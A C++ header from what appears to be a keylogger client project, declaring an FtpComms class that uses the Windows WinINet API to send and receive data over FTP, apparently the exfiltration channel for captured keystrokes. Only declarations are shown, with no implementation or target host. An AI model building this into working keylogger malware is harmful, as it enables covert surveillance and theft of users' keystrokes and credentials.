// KeyLoggerClient/include/communication/FtpComms.h
#ifndef FTPCOMMS_H
#define FTPCOMMS_H

#include "communication/BaseComms.h"
#include <windows.h>    
#include <wininet.h>

class Configuration;

class FtpComms : public BaseComms {
public:
    explicit FtpComms(Configuration* config);
    ~FtpComms();
    
    bool Initialize() override;
    bool SendData(const std::vector<uint8_t>& data) override;
    void Cleanup() override;
    bool TestConnection() const override;
    std::vector<uint8_t> ReceiveData() override;
    
private:
    Configuration* m_config;
    HINTERNET m_hInternet;
    HINTERNET m_hConnect;
};

#endif